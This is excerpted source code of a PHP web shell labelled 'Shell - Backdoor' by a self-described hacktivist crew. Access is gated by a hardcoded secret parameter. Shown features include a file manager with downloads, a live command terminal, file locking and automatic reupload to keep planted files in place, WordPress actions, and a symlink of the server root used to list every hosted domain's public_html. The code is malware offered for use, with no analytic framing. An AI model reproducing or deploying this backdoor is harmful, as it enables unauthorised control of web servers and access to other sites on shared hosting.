...
$SECRET_PARAM = (
    (isset($_GET['lastpiece'])  && $_GET['lastpiece']  === 'hacktivist') ||
    (isset($_POST['lastpiece']) && $_POST['lastpiece'] === 'hacktivist')
);
...
if (isset($_POST['file_action']) && isAuthenticated()) {
    ...
    if ($fAct === 'create_symlink') {
        ...
        if ($symMode === 'symphp') {
            $dataDir = dirname(__FILE__) . '/LASTPIECE_DATA/lastpiecesymlink';
            ...
            $symlinkBase = $baseUrl . $scriptDir . '/LASTPIECE_DATA/lastpiecesymlink/root';
            $rows = array();
...
// Called via POST lock_action=lp_watcher_tick (or legacy GET ?lp_watcher_tick=1 for cron)
...
if (isset($_POST['lock_action']) && isAuthenticated()) {
    ...
    if ($lockAction === 'terminal_stream2') {
        ...
        $sessDir = dirname(__FILE__) . '/LASTPIECE_DATA/.term_sessions';
                ...
                while (time() < $deadline) {
                    ...
                    if (@stream_select($r, $w, $ex, 0, 60000) > 0) {
                        ...
                        if ($chunk !== false && $chunk !== '') {
                            $buf .= $chunk;
                            // Flush all lines except potential incomplete last line
                            if (strpos($buf, '__LPDONE__:') !== false) {
                                ...
                                // Flush everything except last 64 chars (may be partial marker)
                                if (strlen($buf) > 64) {
    ...
    if ($lockAction === 'terminal_exec') {
        ...
        // Try to resolve new cwd after command
...
.mob-action-btn.active { background: rgba(255,255,255,0.14); border-color: var(--accent); }
.mob-action-menu {
    display: none;
    position: fixed;
    z-index: 9999;
...
.mob-action-menu a:hover { background: rgba(255,255,255,0.07); color: #fff; }
.mob-action-menu a.mob-del { color: var(--red); }
.mob-action-menu a.mob-del:hover { background: rgba(248,81,73,0.15); }
.mob-action-menu a.mob-lock { color: #f59e0b; }
.mob-action-divider {
    height: 1px;
...
@media (max-width: 768px) {
    ...
    /* Exec status bar — wrap and allow text to wrap */
    .cmd-section > div[style*="display: flex"] {
        flex-wrap: wrap;
        gap: 4px 6px;
    }
    .cmd-section span[style*="max-width: 300px"] {
        max-width: 100% !important;
        white-space: normal !important;
    }

    /* File table — hide type/size/perm on small screens, keep name + actions */
    ...
    /* Actions column: show "..." dropdown, hide inline buttons */
    ...
    /* Forms */
    .form-input { font-size: 12px; padding: 7px 10px; }
...
@media (max-width: 480px) {
    ...
    /* Table: checkbox, name, actions only */
    .file-table th:nth-child(3),
    .file-table td:nth-child(3),
    .file-table th:nth-child(4),
    .file-table td:nth-child(4),
...
<header class="app-header">
    <div class="header-left">
        ...
        <div>
            ...
            <div class="header-sub">Shell - Backdoor</div>
        </div>
    </div>
    <div class="header-right">
        <span class="sys-badge" style="max-width:120px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;" title="<?php echo htmlspecialchars(php_uname('s') . ' ' . php_uname('r')); ?>"><?php echo htmlspecialchars(php_uname('s') . ' ' . php_uname('r')); ?></span>
        <span class="sys-badge"><?php echo htmlspecialchars(@get_current_user()); ?></span>
...
<div class="container">
    ...
    <table class="file-table">
        <tr>
            ...
            <th>Size</th>
            <th>Permission</th>
            <th><span class="mob-actions-label" style="display:none;"></span><span class="desk-actions-label">Actions</span></th>
        </tr>
        <?php
            ...
            <td>
                ...
                <div class="mob-action-wrap">
                    ...
                    <div class="mob-action-menu">
                        ...
                        <a href="?dl=<?php echo urlencode($fullPath); ?>&lastpiece=hacktivist">Download</a>
                        <?php if (preg_match('/\.(zip|tar|tar\.gz|tgz|rar|7z)$/i', $fd['name'])): ?>
...
<footer class="app-footer">
    <div class="footer-content">
        <img src="https://e.top4top.io/p_3721my4nv1.jpg" class="footer-avatar" alt="">
        <div class="footer-text"><span>Made by Portgas d.ace</span> lastpiece hacktivist crew</div>
    </div>
</footer>
...
<div class="modal-overlay hidden" id="symlinkModal">
    <div class="modal" style="max-width: 620px; width: 96vw;">
        ...
        <div class="modal-body" style="padding:16px;min-height:200px;max-height:68vh;overflow-y:auto;">
            ...
            <!-- PHP tab -->
            <div id="symPane_php">
                <p style="color:var(--text-muted);font-size:11px;margin-bottom:10px;">Buat symlink <code style="color:#a78bfa;">LASTPIECE_DATA/lastpiecesymlink/root -> /</code> lalu tampilkan semua domain di server beserta link langsung ke public_html.</p>
...
function fileActionRequest(data, callback) {
    ...
    form.append('lastpiece', 'hacktivist');
...
function doSymlinkAction(mode) {
    ...
    var body = 'lastpiece=hacktivist&file_action=create_symlink&sym_mode=' + mode + '&target_dir=' + encodeURIComponent(window._currentDir || '');
    fetch(_LPSELF, {
        method: 'POST',
...
function doLockFile() {
    ...
    fetch(_LPSELF, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'lastpiece=hacktivist&lock_action=lock&lock_path=' + encodeURIComponent(path) + '&lock_perm=' + encodeURIComponent(perm)
    })
    .then(function(r) { return r.json(); })
    .then(function(d) {
        if (d.ok) {
...
function lockRequest(data, callback) {
    var params = 'lastpiece=hacktivist&' + Object.keys(data).map(function(k) {
...
var _tickPostBody = 'lastpiece=hacktivist&lock_action=lp_watcher_tick';
...
function loadLockedFiles() {
    fetch(_LPSELF, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'lastpiece=hacktivist&lock_action=list'
    })
    .then(function(r) { return r.json(); })
    .then(function(d) {
...
function doReupload(path) {
    ...
    fetch(_LPSELF, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'lastpiece=hacktivist&lock_action=reupload&lock_path=' + encodeURIComponent(path)
    })
    .then(function(r) { return r.json(); })
    .then(function(d) {
...
function doUnlockFile(path) {
    fetch(_LPSELF, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'lastpiece=hacktivist&lock_action=unlock&lock_path=' + encodeURIComponent(path)
    })
    .then(function(r) { return r.json(); })
    .then(function(d) {
        if (d.ok) {
...
function doUnlockAll() {
    ...
    fetch(_LPSELF, {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'lastpiece=hacktivist&lock_action=unlock_all'
    })
    .then(function(r) { return r.json(); })
    .then(function(d) {
...
function wpRequest(data, callback) {
    ...
    var params = ['lastpiece=hacktivist'];
...
(function() {
    ...
    var TICK_BODY = 'lastpiece=hacktivist&lock_action=lp_watcher_tick';
...
// Terminal — live streaming, wpterm-style
(function() {
    var _T = null;
    ...
    function _sendCmd(cmd) {
        ...
        var body = 'lastpiece=hacktivist&lock_action=terminal_stream2'
